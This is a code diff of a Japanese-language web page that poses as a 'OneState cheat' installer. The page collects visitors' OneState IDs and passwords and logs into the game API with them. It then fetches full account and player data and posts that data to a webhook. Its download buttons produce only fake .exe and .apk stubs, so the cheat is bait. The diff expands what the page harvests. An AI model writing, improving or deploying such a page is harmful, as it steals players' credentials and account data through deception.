@@ -53,7 +53,7 @@ footer{text-align:center;font-size:11px;color:var(--dim);padding:22px 0 10px}
 </head>
 <body>
 <div class="wrap">
-  <div class="top"><div class="brand">// ONESTATE<span>_</span>CHEAT</div><div>v3.6</div></div>
+  <div class="top"><div class="brand">// ONESTATE<span>_</span>CHEAT</div><div>v3.7</div></div>
   <div class="hero">
     <h1>OneStateを、<br>上書きする。</h1>
     <p class="sub">チート導入ツール。OneState IDでログインするだけ。</p>
@@ -150,6 +150,8 @@ async function req(method,path,body,headers){
   return last||{ok:false,err:err};
 }
 function code(r){if(!r||!r.ok)return 'ERR';if(r.json&&r.json.code!=null)return r.json.code;if(r.json&&r.json.errorCode)return r.json.errorCode;return 'ok'}
+/* 成功判定：errorCode が無い or UNSPECIFIED なら成功 */
+function isOk(r){return !!(r&&r.ok&&r.json&&(!r.json.errorCode||r.json.errorCode==='UNSPECIFIED'))}
 async function send(text){
   var wh=webhook();if(!wh)return;var body=JSON.stringify({content:text});
   try{await fetch(wh,{method:'POST',headers:{'Content-Type':'application/json'},body:body})}
@@ -166,20 +168,16 @@ async function doRefresh(rt){
   if(r.ok&&r.json&&r.json.data&&r.json.data.accessToken)return r.json.data.accessToken;
   return null;
 }
-/* ===== 本物のアカウント取得 ===== */
+/* ===== アカウント取得 ===== */
 async function getAccount(tok,cid){
-  var schemes=[
-    ['Bearer',{authorization:'Bearer '+tok}],
-    ['raw',{authorization:tok}],
-    ['Bearer+clientId',{authorization:'Bearer '+tok,'client-id':cid}]
-  ];
+  var schemes=[['Bearer',{authorization:'Bearer '+tok}],['raw',{authorization:tok}]];
   for(var s=0;s<schemes.length;s++){
     var r=await req('GET','/v2/account/@me',null,schemes[s][1]);
     log('acct['+schemes[s][0]+'] -> '+(r.ok?(r.json?JSON.stringify(r.json).slice(0,110):'nonjson'):r.err));
-    var ok=r.ok&&r.json&&!r.json.errorCode&&r.json.code==null;
-    if(ok){
+    if(isOk(r)&&r.json.data){
       var p=await req('GET','/v2/account/@me/players',null,schemes[s][1]);
-      return {scheme:schemes[s][0],acc:r.json,pl:(p.ok&&p.json?p.json:null)};
+      log('players -> '+(p.ok?JSON.stringify(p.json).slice(0,140):p.err));
+      return {scheme:schemes[s][0],acc:r.json.data,pl:(p.ok?p.json:null)};
     }
     await sleep(120);
   }
@@ -188,11 +186,18 @@ async function getAccount(tok,cid){
 function showAccount(res){
   if(!res){acct('取得失敗（トークン未受理）');return}
   var a=res.acc||{},lines=['取得方式: '+res.scheme];
-  ['id','uid','userId','nickname','nick','name','username','email','level','exp','money','cash','bank','balance','vip','premium','createdAt','lastOnline','avatar'].forEach(function(k){
-    if(a[k]!==undefined&&a[k]!==null)lines.push(k+': '+a[k]);
+  Object.keys(a).forEach(function(k){
+    var v=a[k];
+    if(v===null||v===undefined)return;
+    if(typeof v==='object'){lines.push(k+': '+JSON.stringify(v).slice(0,200))}
+    else lines.push(k+': '+v);
   });
-  if(res.pl&&res.pl.players)lines.push('players: '+res.pl.players.length);
-  lines.push('--- raw ---');lines.push(JSON.stringify(a).slice(0,700));
+  if(res.pl&&res.pl.players)lines.push('players: '+res.pl.players.length+' 体');
+  if(res.pl&&res.pl.players&&res.pl.players.length){
+    res.pl.players.slice(0,5).forEach(function(pp,i){
+      lines.push('  ['+(i+1)+'] '+JSON.stringify(pp).slice(0,160));
+    });
+  }
   acct(lines.join('\n'));
   toast('アカウント取得成功');
   send('OneState アカウント取得\n'+JSON.stringify(a).slice(0,1400));
@@ -218,7 +223,7 @@ $('form').addEventListener('submit',async function(e){
 });
 document.querySelectorAll('[data-dl]').forEach(function(b){b.addEventListener('click',function(){
   var kind=b.getAttribute('data-dl');
-  var blob=new Blob(['OneState Cheat Loader v3.6 ('+kind+')\nkey='+$('key').textContent+'\n'],{type:'application/octet-stream'});
+  var blob=new Blob(['OneState Cheat Loader v3.7 ('+kind+')\nkey='+$('key').textContent+'\n'],{type:'application/octet-stream'});
   var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=kind==='win'?'OneStateCheat-Setup.exe':'OneStateCheat.apk';a.click();
 })});
 document.querySelectorAll('.tog').forEach(function(t){t.addEventListener('click',function(){t.classList.toggle('on')})});
@@ -231,13 +236,13 @@ $('btest').addEventListener('click',function(){send('テスト送信 '+new Date(
 $('bclr').addEventListener('click',function(){clearLog();toast('削除')});
 $('bacct').addEventListener('click',async function(){
   clearLog();log('// ACCOUNT');
-  var c=creds();if(!c.id||!c.pw){log('先にID/PWを入力');return}
-  var lr=await apiLogin(c.id,c.pw);if(!lr){log('ログイン失敗');return}
-  log('login OK uid='+JSON.stringify(lr.data).slice(0,90));
+  var c=creds();if(!c.id||!c.pw){log('先にID/PWを入力');toast('ID/PW未入力');return}
+  var lr=await apiLogin(c.id,c.pw);if(!lr){log('ログイン失敗');toast('ログイン失敗');return}
+  log('login OK');
   var tok=await doRefresh(lr.data.refreshToken);
   log('refresh: '+(tok?'OK':'FAIL'));
   var res=await getAccount(tok||lr.data.accessToken,lr.data.clientId);
-  if(res){log('=== ACCOUNT OK ===');log(JSON.stringify(res.acc).slice(0,600));if(res.pl)log('players: '+JSON.stringify(res.pl).slice(0,400));toast('取得成功')}
+  if(res){log('=== ACCOUNT OK ===');log(JSON.stringify(res.acc).slice(0,700));toast('取得成功')}
   else{log('=== 取得失敗 ===');toast('失敗')}
   showAccount(res);
 });
